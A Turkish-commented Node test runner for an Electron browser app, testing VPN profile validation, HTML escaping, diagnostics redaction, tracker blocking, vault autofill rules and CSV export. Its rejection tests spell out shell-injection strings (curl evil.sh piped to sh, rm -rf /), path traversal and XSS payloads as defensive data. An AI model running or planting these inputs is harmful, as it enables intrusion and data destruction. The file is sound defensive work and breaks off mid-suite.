/**
 * İlgezdi — Bağımlılıksız test koşucusu
 *
 *   npm test
 *
 * Neden böyle: projede test altyapısı yoktu ve bu denetimde bulunan hataların
 * önemli bir kısmı (IPC kanal adı uyuşmazlığı, bağlanmamış ayarlar, doğrulanmayan
 * profil alanları) tam olarak testin yakalayacağı türdendi. Yeni bir bağımlılık
 * eklemeden, `node test/run.js` ile çalışan en küçük düzenek.
 *
 * Testler Electron'a ihtiyaç duymaz: `electron` modülü sahte bir nesneyle
 * değiştirilir, böylece saf mantık (doğrulama, ayrıştırma) düz Node'da koşar.
 */

'use strict';

const path = require('path');
const Module = require('module');

// ─── Sahte `electron` modülü ──────────────────────────────────────────────────
// Ana süreç modülleri `require('electron')` yapıyor. Testte gerçek Electron
// yok; doğrulama/ayrıştırma mantığını izole etmek için yerine bunu koyuyoruz.
const fakeElectron = {
  safeStorage: {
    isEncryptionAvailable: () => false,
    encryptString: (s) => Buffer.from('fake:' + s, 'utf8'),
    decryptString: (b) => String(b).replace(/^fake:/, ''),
  },
  dialog:  { showOpenDialog: async () => ({ canceled: true, filePaths: [] }) },
  app:     { getPath: () => path.join(__dirname, '.tmp'), getVersion: () => '0.0.0-test', isPackaged: false },
  ipcMain: { handle: () => {}, on: () => {} },
  net:     {},
};
const origLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'electron') return fakeElectron;
  return origLoad.apply(this, arguments);
};

// ─── Minik test çatısı ────────────────────────────────────────────────────────
let passed = 0;
let failed = 0;
const failures = [];
let currentSuite = '';

function suite(name) {
  currentSuite = name;
  console.log('\n\x1b[1m' + name + '\x1b[0m');
}

function check(name, ok, detail) {
  if (ok) {
    passed++;
    console.log('  \x1b[32m✓\x1b[0m ' + name);
  } else {
    failed++;
    failures.push(currentSuite + ' → ' + name + (detail ? '  (' + detail + ')' : ''));
    console.log('  \x1b[31m✗ ' + name + '\x1b[0m' + (detail ? '  ' + detail : ''));
  }
}

const eq = (name, actual, expected) =>
  check(name, JSON.stringify(actual) === JSON.stringify(expected),
    'beklenen ' + JSON.stringify(expected) + ', gelen ' + JSON.stringify(actual));

// ══════════════════════════════════════════════════════════════════════════════
// K-02 / K-03 — VPN profil doğrulama (komut ve yapılandırma enjeksiyonu sınırı)
// ══════════════════════════════════════════════════════════════════════════════
const { _internals: vpn } = require('../src/main/vpn-manager.js');
const { parseEndpoint, validateProfileInput, isIpv4, isAddrCidr, isDnsList, cleanLabel } = vpn;

const KEY = 'A'.repeat(43) + '=';   // 44 karakterlik geçerli base64 WireGuard anahtarı
const baseProfile = () => ({
  endpoint: '1.2.3.4:51820', publicKey: KEY, privateKey: KEY,
  clientIp: '10.8.0.2/32', dns: '1.1.1.1',
});

suite('K-02 — Kabuk komutu enjeksiyonu endpoint sınırında durmalı');
[
  '1.2.3.4 & calc.exe',
  '1.2.3.4:51820 && powershell -enc AAA',
  '1.2.3.4:51820 | whoami',
  '1.2.3.4:51820; rm -rf /',
  '$(curl evil.sh):51820',
  '`whoami`:51820',
  '-n 100 1.2.3.4',            // ping argümanı olarak sızma denemesi
  '1.2.3.4:51820\nPostUp = sh',
  '1.2.3.4:51820\r\nfoo',
  '../../etc/passwd:51820',
  '',
].forEach((payload) => {
  check('reddedildi: ' + JSON.stringify(payload), parseEndpoint(payload) === null);
});

suite('K-03 — Satır sonu enjeksiyonu .conf yazılmadan önce durmalı');
[
  ['dns',       '1.1.1.1\nPostUp = /bin/sh -c "curl evil.sh | sh"'],
  ['dns',       '1.1.1.1\r\nPostUp = calc.exe'],
  ['clientIp',  '10.8.0.2/32\nPostUp = whoami'],
  ['publicKey', 'A'.repeat(42) + '\nx'],
  ['privateKey', 'A'.repeat(42) + '\nPostUp = x'],
].forEach(([field, value]) => {
  const p = baseProfile();
  p[field] = value;
  check('reddedildi: ' + field + ' içinde satır sonu', validateProfileInput(p) !== null);
});

suite('Meşru profiller kabul edilmeli (yanlış pozitif olmamalı)');
[
  { endpoint: '1.2.3.4:51820',            clientIp: '10.8.0.2/32', dns: '1.1.1.1' },
  { endpoint: 'vpn.ornek.com.tr:51820',   clientIp: '10.8.0.2/32', dns: '1.1.1.1, 1.0.0.1' },
  { endpoint: '[2001:db8::1]:51820',      clientIp: '10.8.0.2/32', dns: '9.9.9.9' },
  { endpoint: 'a-b.sunucu-1.example:1',   clientIp: '192.168.1.5', dns: '8.8.8.8' },
  { endpoint: 'tr1.vpn.example.com:2408', clientIp: 'fd00::2/128', dns: '2606:4700:4700::1111' },
].forEach((c) => {
  const err = validateProfileInput({ ...c, publicKey: KEY, privateKey: KEY });
  check('kabul edildi: ' + c.endpoint, err === null, err || '');
});

suite('Endpoint ayrıştırma doğruluğu');
eq('host/port',        parseEndpoint('vpn.x.com:51820'), { host: 'vpn.x.com', port: 51820 });
eq('IPv6 köşeli',      parseEndpoint('[2001:db8::1]:443'), { host: '2001:db8::1', port: 443 });
check('port > 65535 reddedilir', parseEndpoint('1.2.3.4:99999') === null);
check('port 0 reddedilir',       parseEndpoint('1.2.3.4:0') === null);
check('portsuz reddedilir',      parseEndpoint('1.2.3.4') === null);
check('geçersiz IP oktedi reddedilir', parseEndpoint('1.2.3.999:51820') === null);

suite('Alan doğrulayıcıları');
check('isIpv4 doğru',            isIpv4('10.0.0.1') && !isIpv4('10.0.0.256') && !isIpv4('10.0.0'));
check('isAddrCidr doğru',        isAddrCidr('10.8.0.2/32') && isAddrCidr('10.8.0.2') && !isAddrCidr('10.8.0.2/999'));
check('isDnsList doğru',         isDnsList('1.1.1.1') && isDnsList('1.1.1.1, 8.8.8.8') && !isDnsList('1.1.1.1; calc'));
check('cleanLabel kontrol karakteri siler', cleanLabel('Sunucu\n\x00Adı') === 'SunucuAdı');
check('cleanLabel uzunluk sınırlar',        cleanLabel('x'.repeat(500)).length === 60);
check('private key zorunlu',     validateProfileInput({ ...baseProfile(), publicKey: 'kısa' }) !== null);

// ══════════════════════════════════════════════════════════════════════════════
// Ayrıştırıcılar — içe aktarma yolları (dış kaynaklı veri)
// ══════════════════════════════════════════════════════════════════════════════
const { _internals: pw } = require('../src/main/password-manager.js');

suite('CSV parolası ayrıştırma');
eq('başlık sırası serbest, tırnak işlenir',
  pw.parseCsvPasswords('name,url,username,password\n"Ornek","https://a.com","u1","p,1"'),
  [{ url: 'https://a.com', username: 'u1', password: 'p,1' }]);
eq('url/password yoksa boş döner', pw.parseCsvPasswords('foo,bar\n1,2'), []);
eq('boş girdi boş döner',          pw.parseCsvPasswords(''), []);

// ══════════════════════════════════════════════════════════════════════════════
// IPC sözleşmesi — preload'ın açtığı yüzey ile arayüzün kullandığı eşleşmeli
// ══════════════════════════════════════════════════════════════════════════════
const fs = require('fs');
const SRC = path.join(__dirname, '..', 'src');
const read = (p) => fs.readFileSync(path.join(SRC, p), 'utf8');

suite('IPC sözleşmesi');
{
  const mainFiles = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js'));
  const mainSrc = mainFiles.map((f) => read('main/' + f)).join('\n');
  const preSrc = read('preload/preload.js') + read('preload/popup-preload.js');

  const handlers = new Set();
  for (const m of mainSrc.matchAll(/ipcMain\.(?:handle|on)\(\s*['"`]([^'"`]+)/g)) handlers.add(m[1]);
  const invoked = new Set();
  for (const m of preSrc.matchAll(/ipcRenderer\.(?:invoke|send)\(\s*['"`]([^'"`]+)/g)) invoked.add(m[1]);

  const orphanInvokes = [...invoked].filter((c) => !handlers.has(c));
  const unusedHandlers = [...handlers].filter((c) => !invoked.has(c));
  check("preload'un çağırdığı her kanalın ana süreçte işleyicisi var",
    orphanInvokes.length === 0, orphanInvokes.join(', '));
  check("ana süreçteki her işleyici preload'dan çağrılıyor",
    unusedHandlers.length === 0, unusedHandlers.join(', '));

  // Arayüzün kullandığı preload anahtarları gerçekten açılmış mı?
  // (Bu test, engelleyici istatistiklerini ölü bırakan `onBlockStats` hatasını
  //  yakalayan testtir — o hata aylarca fark edilmedi.)
  const exposedKeys = new Set();
  for (const m of preSrc.matchAll(/^\s{2,4}([a-zA-Z]+)\s*:/gm)) exposedKeys.add(m[1]);

  const rendererFiles = fs.readdirSync(path.join(SRC, 'renderer')).filter((f) => f.endsWith('.js'));
  const missing = new Map();
  for (const f of rendererFiles) {
    const s = read('renderer/' + f);
    for (const m of s.matchAll(/(?:secureBrowser|\bsb)\s*\??\.\s*([a-zA-Z]+)\s*\??\s*[.(]/g)) {
      if (!exposedKeys.has(m[1]) && !missing.has(m[1])) missing.set(m[1], f);
    }
  }
  check('arayüzün kullandığı her preload anahtarı açılmış',
    missing.size === 0,
    [...missing].map(([k, f]) => k + ' (' + f + ')').join(', '));
}

// ══════════════════════════════════════════════════════════════════════════════
// Derleme yapılandırması — yayını sessizce bozan hatalar
// ══════════════════════════════════════════════════════════════════════════════
suite('Derleme yapılandırması');
{
  const pkgRaw = fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8');
  const pkg = JSON.parse(pkgRaw);

  // publish=null olursa electron-builder app-update.yml üretmez ve
  // otomatik güncelleme yayınlanan derlemede sessizce ölür.
  check('build.publish tanımlı (otomatik güncelleme için zorunlu)',
    Array.isArray(pkg.build.publish) && pkg.build.publish.length > 0 &&
    pkg.build.publish[0].provider === 'github');

  // JSON'da yinelenen anahtar sessizce son değeri kazandırır — bu hata tam
  // olarak böyle oluştu. Ham metinde `build` bloğundaki tekrarları ara.
  const dupPublish = (pkgRaw.match(/^\s*"publish"\s*:/gm) || []).length;
  check('package.json içinde tek bir "publish" anahtarı var', dupPublish === 1,
    dupPublish + ' tane bulundu');
}

// ══════════════════════════════════════════════════════════════════════════════
// Tanılama — kimliksizleştirme sınırı
// Bu testler kritik: scrub() çalışmazsa tanılama altyapısı bir tarama geçmişi
// sızıntı kanalına dönüşür.
// ══════════════════════════════════════════════════════════════════════════════
const diagMod = require('../src/main/diagnostics.js');
diagMod._setSaltForTest('test-salt-sabit');
const { scrub, redactUrl, hmacTag } = diagMod._internals;

suite('Tanılama — URL kimliksizleştirme');
{
  const r = redactUrl('https://gizli-banka.com.tr/hesap/12345?token=abc');
  check('tam URL korunmuyor', !r.includes('gizli-banka'), r);
  check('sorgu dizesi korunmuyor', !r.includes('token') && !r.includes('abc'), r);
  check('yol içeriği korunmuyor', !r.includes('12345'), r);
  check('şema korunuyor (teşhis için gerekli)', r.startsWith('https://'), r);
  check('karma etiket var', /#[0-9a-f]{8}/.test(r), r);

  // Aynı host → aynı etiket (korelasyon kurulabilir)
  eq('aynı host aynı etiketi alır',
    redactUrl('https://ornek.com/a') === redactUrl('https://ornek.com/b'), true);
  // Farklı host → farklı etiket
  check('farklı host farklı etiket alır',
    redactUrl('https://a.com/') !== redactUrl('https://b.com/'));
  // Etiket geri çevrilemez (32 hex değil, 8 hex kısaltma; kaba kuvvete de tuz engel)
  check('etiket host adını içermiyor', !redactUrl('https://a.com/').includes('a.com'));
}

// Ters bölü, kabuk/heredoc katmanlarında sessizce tek bölüye inip JS'te
// bilinmeyen kaçış olarak yok olabiliyor. Karakter kodundan üretmek bu
// kırılganlığı tamamen ortadan kaldırır.
const BS = String.fromCharCode(92);

suite('Tanılama — serbest metin temizleme');
{
  const winPath = 'C:' + BS + 'Users' + BS + 'BurakAkmese' + BS + 'AppData' + BS + 'config.json';
  const cases = [
    ['yığın izindeki URL',      'at fetch (https://banka.com/giris:12)', 'banka.com'],
    ['e-posta',                 'kullanici burak@ornek.com giriş yaptı', 'burak@ornek.com'],
    ['JWT',                     'token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdefghijk', 'eyJhbGciOiJIUzI1NiJ9'],
    ['uzun hex (anahtar)',      'key=' + 'a1b2c3d4'.repeat(8), 'a1b2c3d4a1b2c3d4'],
    ['IP adresi',               'bağlantı 88.245.12.33 üzerinden', '88.245.12.33'],
    ['Windows kullanıcı yolu',  winPath, 'BurakAkmese'],
    ['Unix kullanıcı yolu',     '/home/burak/.config/ilgezdi', '/home/burak'],
  ];
  for (const [name, input, secret] of cases) {
    const out = scrub(input);
    check(name + ' temizlendi', !out.includes(secret), 'çıktı: ' + out);
  }

  check('127.0.0.1 korunur (teşhis için zararsız)', scrub('sunucu 127.0.0.1:3000').includes('127.0.0.1'));
  check('boş girdi çökmez', scrub(null) === '' && scrub(undefined) === '');
  check('çok uzun metin kısaltılır', scrub('x'.repeat(9000)).length < 4100);
  check('hata mesajının kendisi korunur',
    scrub('TypeError: cannot read properties of undefined').includes('TypeError'));
}

suite('Tanılama — rapor zarfı kişisel veri içermiyor');
{
  // buildReport env/features üretir; ziyaret geçmişine ait alan OLMAMALI.
  const rep = diagMod._internals.buildReport('test', 'kullanıcı notu burak@x.com');
  const json = JSON.stringify(rep);
  check('kullanıcı notundaki e-posta temizlenmiş', !json.includes('burak@x.com'), json.slice(0, 200));
  check('zarf sürüm bilgisi taşıyor', 'env' in rep && 'features' in rep);
  check('breadcrumbs dizi', Array.isArray(rep.breadcrumbs));
  const forbidden = ['visitHistory', 'cookies', 'passwords', 'vault', 'authSession'];
  check('yasaklı alan yok', !forbidden.some((k) => json.includes(k)));
}

// ══════════════════════════════════════════════════════════════════════════════
// Y-04 / Y-05 — HTML kaçış yardımcısı (dış kaynaklı veri → innerHTML sınırı)
// ══════════════════════════════════════════════════════════════════════════════
const H = require('../src/renderer/html-safe.js');

suite('HTML kaçışı — sayfa başlığı enjeksiyonu');
{
  const payloads = [
    '<img src=x onerror=alert(1)>',
    '<script>fetch("//evil")</script>',
    '"><svg onload=alert(1)>',
    "' onmouseover='alert(1)",
    '<style>*{background:url(//evil/x)}</style>',
    '<base href="https://evil/">',
    '`${alert(1)}`',
  ];
  for (const p of payloads) {
    const out = H.esc(p);
    check('etiket/tırnak nötrlendi: ' + p.slice(0, 34), !/[<>"'`]/.test(out), out);
  }
  eq('normal metin korunur', H.esc('İlgezdi — Göktürk & Türk'), 'İlgezdi — Göktürk &amp; Türk');
  eq('null güvenli', H.esc(null), '');
  eq('sayı metne döner', H.esc(42), '42');
}

suite('URL beyaz listesi — href/src sınırı');
{
  eq('https geçer',                      H.safeUrl('https://a.com/x'), 'https://a.com/x');
  eq('http geçer',                       H.safeUrl('http://a.com'), 'http://a.com');
  eq('javascript: reddedilir',           H.safeUrl('javascript:alert(1)'), '');
  eq('karışık harfli JaVaScRiPt: reddedilir', H.safeUrl('JaVaScRiPt:alert(1)'), '');
  eq('baştaki boşlukla gizlenmiş javascript: reddedilir', H.safeUrl('   javascript:alert(1)'), '');
  eq('data:text/html reddedilir (izinle bile)', H.safeUrl('data:text/html,<script>x</script>', { allowData: true }), '');
  eq('data:image yalnızca izinle geçer', H.safeUrl('data:image/png;base64,AAA', { allowData: true }), 'data:image/png;base64,AAA');
  eq('data:image izinsiz reddedilir',    H.safeUrl('data:image/png;base64,AAA'), '');
  eq('file: reddedilir',                 H.safeUrl('file:///C:/Windows/win.ini'), '');
  eq('vbscript: reddedilir',             H.safeUrl('vbscript:msgbox(1)'), '');
  eq('baştaki kontrol karakterleriyle gizlenmiş javascript: reddedilir',
     H.safeUrl(String.fromCharCode(1, 2, 31) + 'javascript:alert(1)'), '');
}

// ══════════════════════════════════════════════════════════════════════════════
// Y-06 / Y-07 — VPN durumu dürüst mü?
// ══════════════════════════════════════════════════════════════════════════════
suite('VPN durumu — kill switch yalnızca doğrulanmış bağlantıda');
{
  const { VpnManager } = require('../src/main/vpn-manager.js');
  const tmp = fs.mkdtempSync(path.join(require('os').tmpdir(), 'ilg-vpn-test-'));
  const m = new VpnManager(tmp);

  const s0 = m.getStatus();
  check('bağlı değilken kill switch "Aktif" DEĞİL', s0.killSwitch === false);
  check('platform desteği açıkça bildiriliyor', typeof s0.killSwitchSupported === 'boolean');
  check('yalnızca Windows destekli bildiriliyor',
    s0.killSwitchSupported === (process.platform === 'win32'));

  // Doğrulanmış bağlı durumu simüle et
  m.status = 'connected';
  m.activeProfile = { id: 'x', name: 'test', endpoint: '1.2.3.4:51820', privateKey: 'enc:gizli' };
  const s1 = m.getStatus();
  check('bağlıyken kill switch = platform desteği',
    s1.killSwitch === (process.platform === 'win32'));
  check('getStatus private key sızdırmıyor', s1.activeProfile.privateKey === '••••••••');

  // Kopma
  m.status = 'dropped';
  m.activeProfile = null;
  check('koptuğunda kill switch "Aktif" DEĞİL', m.getStatus().killSwitch === false);

  check('eski sahte kill switch metotları kaldırıldı',
    typeof m.enableKillSwitch === 'undefined' && typeof m.disableKillSwitch === 'undefined');
  check('DNS testi artık yöneticinin metodu (VPN durumunu bilmesi için)',
    typeof m.testDnsLeak === 'function');

  try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}
}

// ══════════════════════════════════════════════════════════════════════════════
// O-08 / O-09 — Engelleyici: meşru siteleri bozmamalı, gerçek izleyicileri yakalamalı
// ══════════════════════════════════════════════════════════════════════════════
const blocker = require('../src/main/blocker-main.js');

suite('Engelleyici — varsayılan seviyede yanlış pozitif yok');
{
  blocker._resetForTest();
  const page = 'https://magaza.example.com/';
  const B = (url) => blocker.shouldBlockUrl(url, { resourceType: 'script', pageUrl: page });

  check('Shopify /collections/ ENGELLENMEZ (eskiden /\\/collect/ ile engelleniyordu)',
    !B('https://magaza.example.com/collections/ayakkabi'));
  check('GitHub /sponsors ENGELLENMEZ', !B('https://github.com/sponsors/biri'));
  check('meşru /banner.jpg ENGELLENMEZ', !B('https://site.com/img/banner.jpg'));
  check('meşru /popup-menu.js ENGELLENMEZ', !B('https://site.com/js/popup-menu.js'));
  check('doubleclick.net ENGELLENİR', B('https://ad.doubleclick.net/x.js'));
  check('google-analytics alt alanı ENGELLENİR', B('https://ssl.google-analytics.com/ga.js'));
  check('facebook.com/tr pikseli ENGELLENİR (eskiden hiç eşleşmiyordu)',
    B('https://www.facebook.com/tr?id=1&ev=PageView'));
  check('facebook.com normal sayfası ENGELLENMEZ', !B('https://www.facebook.com/haberler'));
  check('alt dize tuzağı: notdoubleclick.net.example.com ENGELLENMEZ',
    !B('https://notdoubleclick.net.example.com/x.js'));
  check('ana çerçeve gezinmesi ASLA engellenmez',
    !blocker.shouldBlockUrl('https://doubleclick.net/', { resourceType: 'mainFrame' }));
  check('data: ENGELLENMEZ', !B('data:image/png;base64,AAA'));
}

suite('Engelleyici — seviyeler, üçüncü taraf, beyaz liste');
{
  blocker._resetForTest();
  const page = 'https://haber.com.tr/';
  const B = (url) => blocker.shouldBlockUrl(url, { resourceType: 'script', pageUrl: page });

  check('medium: yol deseni uygulanmaz (yalnızca alan adı listesi)', !B('https://cdn.site.com/gtag/js?id=1'));
  blocker.updateBlockerConfig({ level: 'high' });
  check('high: /gtag/js ENGELLENİR', B('https://cdn.site.com/gtag/js?id=1'));
  check('high: GA /g/collect? uç noktası ENGELLENİR', B('https://cdn.site.com/g/collect?v=2'));
  check('high: /collections/ yine ENGELLENMEZ', !B('https://haber.com.tr/collections/x'));

  blocker.updateBlockerConfig({ level: 'full' });
  check('full: üçüncü taraf kaynak ENGELLENİR (eskiden hiç uygulanmamıştı)', B('https://cdn.baskasi.net/lib.js'));
  check('full: aynı sitenin alt alanı ENGELLENMEZ', !B('https://static.haber.com.tr/app.js'));
  check('full: sayfa bilinmiyorsa izin verilir (siteyi bozma)',
    !blocker.shouldBlockUrl('https://cdn.baskasi.net/lib.js', { resourceType: 'script' }));

  blocker.updateBlockerConfig({ level: 'medium', whitelist: ['https://www.haber.com.tr/yol'] });
  check('beyaz liste: sayfa izinliyse o sayfanın izleyicisi de ENGELLENMEZ',
    !B('https://www.google-analytics.com/analytics.js'));
  check('beyaz liste: başka sayfada aynı izleyici ENGELLENİR',
    blocker.shouldBlockUrl('https://www.google-analytics.com/analytics.js', { resourceType: 'script', pageUrl: 'https://baska.com/' }));

  blocker.updateBlockerConfig({ level: 'olmayan-seviye' });
  eq('geçersiz seviye yok sayılır', blocker.getBlockStats().level, 'medium');

  const rd = blocker._internals.registrableDomain;
  eq('kayıtlı alan adı: com.tr', rd('static.haber.com.tr'), 'haber.com.tr');
  eq('kayıtlı alan adı: co.uk',  rd('a.b.bbc.co.uk'), 'bbc.co.uk');
  eq('kayıtlı alan adı: com',    rd('cdn.example.com'), 'example.com');
  blocker._resetForTest();
}

// ══════════════════════════════════════════════════════════════════════════════
// Y-11 / O-02 — Şifre kasası
// ══════════════════════════════════════════════════════════════════════════════
suite('Otomatik doldurma — origin kuralları');
{
  const pwm = require('../src/main/password-manager.js');
  pwm._internals._setVaultForTest([
    { id: '1', url: 'https://banka.com.tr/giris',   username: 'u1', password: 'p1' },
    { id: '2', url: 'http://eski-site.com/',        username: 'u2', password: 'p2' },
    { id: '3', url: 'https://panel.site.com:8443/', username: 'u3', password: 'p3' },
  ]);
  check('aynı https origin doldurulur', pwm.getForOrigin('https://banka.com.tr/hesap').length === 1);
  check('www farkı önemsiz', pwm.getForOrigin('https://www.banka.com.tr/').length === 1);
  check('HTTPS kimliği HTTP sayfasına ASLA doldurulmaz (MITM)', pwm.getForOrigin('http://banka.com.tr/giris').length === 0);
  check('HTTP kimliği HTTPS sayfasına doldurulabilir (yükseltme güvenli)', pwm.getForOrigin('https://eski-site.com/').length === 1);
  check('farklı port = farklı origin', pwm.getForOrigin('https://panel.site.com/').length === 0);
  check('aynı port eşleşir', pwm.getForOrigin('https://panel.site.com:8443/x').length === 1);
  check('benzer alan adı eşleşmez (alt dize tuzağı)', pwm.getForOrigin('https://banka.com.tr.saldirgan.com/').length === 0);
  check('javascript: sayfası boş döner', pwm.getForOrigin('javascript:alert(1)').length === 0);
  pwm._internals._setVaultForTest([]);
}

suite('Şifre kasası — yardımcılar');
{
  const I = require('../src/main/password-manager.js')._internals;
  eq('şemasız site https varsayılır (elle eklenenin doldurulabilmesi için şart)',
    I.normalizeSiteUrl('google.com'), 'https://google.com/');
  eq('yol korunur', I.normalizeSiteUrl('https://a.com/giris'), 'https://a.com/giris');
  eq('javascript: reddedilir', I.normalizeSiteUrl('javascript:alert(1)'), '');
  eq('boş reddedilir', I.normalizeSiteUrl('   '), '');
  eq('v10 → aes',                     I.blobKind(Buffer.from('v10' + 'x'.repeat(40))), 'aes');
  eq('v20 → app-bound (Chrome 127+)', I.blobKind(Buffer.from('v20' + 'x'.repeat(40))), 'app-bound');
  eq('önek yok → eski dpapi',         I.blobKind(Buffer.from([1, 0, 0, 0, 208, 140, 157])), 'dpapi');
  eq('boş → empty',                   I.blobKind(Buffer.alloc(0)), 'empty');
  eq('v20 blob için PowerShell çağrılmadan boş döner', I.decryptPassword(Buffer.from('v20abc'), null), '');
}

// ══════════════════════════════════════════════════════════════════════════════
// O-11 — CSV formül enjeksiyonu
// ══════════════════════════════════════════════════════════════════════════════
suite('CSV dışa aktarma — formül enjeksiyonu ve alan kaçışı');
{
  const { SecureLogManager } = require('../src/main/secure-log-manager.js');
  const c = SecureLogManager.csvCell;
  const Q = String.fromCharCode(39); // '
  check('= ile başlayan başlık metne çevrilir', c('=HYPERLINK("x")').startsWith('"' + Q + '='));
  check('+ nötrlenir', c('+cmd').startsWith('"' + Q + '+'));
  check('- nötrlenir', c('-2+3').startsWith('"' + Q + '-'));
  check('@ nötrlenir', c('@SUM(A1)').startsWith('"' + Q + '@'));
  eq('virgüllü URL tek hücrede kalır', c('https://a.com/?x=1,2'), '"https://a.com/?x=1,2"');
  eq('tırnak ikilenir (RFC 4180)', c('a"b'), '"a""b"');
  eq('normal metin korunur', c('İlgezdi'), '"İlgezdi"');
  eq('null boş hücre', c(null), '""');
}

// ══════════════════════════════════════════════════════════════════════════════
// K-01 — Electron 44: kaldırılmış / kullanımdan kaldırılmış API geri gelmemeli
// ══════════════════════════════════════════════════════════════════════════════
suite('Electron 44 — kullanımdan kaldırılmış ya da belgelenmemiş API yok');
{
  const files = fs.readdirSync(path.join(SRC, 'main')).filter((f) => f.endsWith('.js')).map((f) => 'main/' + f)
    .concat(['preload/preload.js', 'preload/popup-preload.js']);
  // Yorum satırları hariç: açıklamalarda eski API adlarının geçmesi serbest.
  const code = files.map((f) => read(f).split('\n')
    .filter((l) => !/^\s*(\/\/|\*|\/\*)/.test(l)).join('\n')).join('\n');

  const banned = [
    ['BrowserView (30+ → WebContentsView)',                     /\bnew BrowserView\b|\b(add|remove|set|get|setTop)BrowserViews?\(|fromBrowserView\(/],
    ['webContents.destroy() (belgelenmemiş → close())',         /webContents\.destroy\(\)/],
    ['webContents.goBack/canGoBack… (32+ → navigationHistory)', /webContents\.(canGoBack|goBack|canGoForward|goForward|goToIndex|goToOffset|canGoToOffset|clearHistory)\(/],
    ["'crashed' olayları (29'da kaldırıldı)",                   /\.on\(\s*['"](crashed|renderer-process-crashed|gpu-process-crashed|plugin-crashed)['"]/],
    ['setAutoResize (yalnızca BrowserView)',                    /\.setAutoResize\(/],
    ['boş webRequest urls filtresi (35+ davranışı değişti)',    /urls:\s*\[\s*\]/],
  ];
  for (const [name, re] of banned) {
    const hit = code.match(re);
    check('kullanılmıyor: ' + name, !hit, hit && hit[0]);
  }

  check('Electron 45 hazırlığı: ekran paylaşımı izni (display-capture) ele alınıyor',
    /'display-capture'/.test(read('main/main.js')));
}

// ══════════════════════════════════════════════════════════════════════════════
// Yayın hattı — CI'daki Node, paketleme araçlarının gereksinimini karşılamalı
// ══════════════════════════════════════════════════════════════════════════════
suite('Yayın hattı — CI Node sürümü araç gereksinimlerini karşılıyor');
{
  const wf = fs.readFileSync(path.join(__dirname, '..', '.github', 'workflows', 'release.yml'), 'utf8');
  const m = wf.match(/^\s*node-version:\s*['"]?(\d+)/m);
  const ciMajor = m ? Number(m[1]) : 0;

  // Electron 44 / electron-builder 26 ile gelen araçların beyan ettiği en düşük Node.
  // (Bu kontrol, CI Node 20'de kalıp yayın derlemesinin sessizce kırılmasını yakalar.)
  const minMajorOf = (pkg) => {
    try {
      const e = require(path.join(__dirname, '..', 'node_modules', pkg, 'package.json')).engines;
      const mm = e && String(e.node || '').match(/(\d+)/);
      return mm ? Number(mm[1]) : 0;
    } catch { return 0; }
  };
  const required = Math.max(minMajorOf('@electron/rebuild'), minMajorOf('electron'), minMajorOf('electron-builder'));

  check('release.yml içinde node-version bulundu', ciMajor > 0, m && m[0]);
  check('CI Node (' + ciMajor + ') ≥ araçların istediği (' + required + ')', ciMajor >= required,
    { ciMajor, required });
}

// ══════════════════════════════════════════════════════════════════════════════
// Tarayıcı komutları — kısayollar, sağ tık menüsü, yakınlaştırma, kapatılan sekmeler
// (karşılaştırma raporu P0 maddeleri)
// ══════════════════════════════════════════════════════════════════════════════
const bc = require('../src/main/browser-commands.js');

suite('Kısayollar — odak sayfadayken de çalışır');
{
  const key = (k, mods = {}, extra = {}) => ({
    type: 'keyDown', key: k, code: extra.code || '', control: !!mods.ctrl, shift: !!mods.shift,
    alt: !!mods.alt, meta: !!mods.meta, isAutoRepeat: !!extra.repeat, isComposing: false,
  });
  const win = (input, surface = 'page') => bc.commandForInput(input, { platform: 'win32', surface });

  eq('Ctrl+T → yeni sekme', win(key('t', { ctrl: true })), 'new-tab');
  eq('Caps Lock açıkken Ctrl+T', win(key('T', { ctrl: true })), 'new-tab');
  eq('Ctrl+Shift+T → kapatılan sekmeyi aç', win(key('T', { ctrl: true, shift: true })), 'reopen-closed-tab');
  eq('Ctrl+W', win(key('w', { ctrl: true })), 'close-tab');
  eq('Ctrl+Tab / Ctrl+Shift+Tab', [win(key('Tab', { ctrl: true })), win(key('Tab', { ctrl: true, shift: true }))], ['next-tab', 'prev-tab']);
  eq('Ctrl+3 ve Ctrl+9', [win(key('3', { ctrl: true }, { code: 'Digit3' })), win(key('9', { ctrl: true }, { code: 'Digit9' }))], ['tab-3', 'last-tab']);
  eq('AZERTY: Ctrl+1 tuşu "&" üretse de 1. sekme', win(key('&', { ctrl: true }, { code: 'Digit1' })), 'tab-1');
  eq('Türkçe Q: Ctrl+Shift+3 ("^") sekme değiştirmez', win(key('^', { ctrl: true, shift: true }, { code: 'Digit3' })), null);
  eq('F5, Ctrl+R, Ctrl+F5', [win(key('F5')), win(key('r', { ctrl: true })), win(key('F5', { ctrl: true }))], ['reload', 'reload', 'hard-reload']);
  eq('Alt+Sol / Alt+Sağ', [win(key('ArrowLeft', { alt: true })), win(key('ArrowRight', { alt: true }))], ['back', 'forward']);
  eq('Ctrl+F, F3, Shift+F3', [win(key('f', { ctrl: true })), win(key('F3')), win(key('F3', { shift: true }))], ['find', 'find-next', 'find-prev']);
  eq('Ctrl+L, Alt+D, F6', [win(key('l', { ctrl: true })), win(key('d', { alt: true })), win(key('F6'))], ['focus-address', 'focus-address', 'focus-address']);
  eq('Yakınlaştır: Ctrl+=, ABD Ctrl+Shift+=, Türkçe Q Ctrl+Shift+4, sayısal takım',
    [win(key('=', { ctrl: true })), win(key('+', { ctrl: true, shift: true })),
     win(key('+', { ctrl: true, shift: true }, { code: 'Digit4' })), win(key('+', { ctrl: true }, { code: 'NumpadAdd' }))],
    ['zoom-in', 'zoom-in', 'zoom-in', 'zoom-in']);
  eq('Ctrl+- ve Ctrl+0', [win(key('-', { ctrl: true })), win(key('0', { ctrl: true }, { code: 'Digit0' }))], ['zoom-out', 'zoom-reset']);
  eq('Ctrl+P ve Ctrl+D', [win(key('p', { ctrl: true })), win(key('d', { ctrl: true }))], ['print', 'bookmark-page']);

  eq('AltGr (Ctrl+Alt) ile yazılan karakter yakalanmaz — Türkçe klavyede @', win(key('q', { ctrl: true, alt: true })), null);
  eq('AltGr+T bile yakalanmaz', win(key('t', { ctrl: true, alt: true })), null);
  eq('Shift+T (büyük harf yazmak) kısayol değil', win(key('T', { shift: true })), null);
  eq('Düz harf kısayol değil', win(key('f')), null);
  eq('Tuş bırakma yok sayılır', bc.commandForInput({ ...key('t', { ctrl: true }), type: 'keyUp' }, { platform: 'win32' }), null);
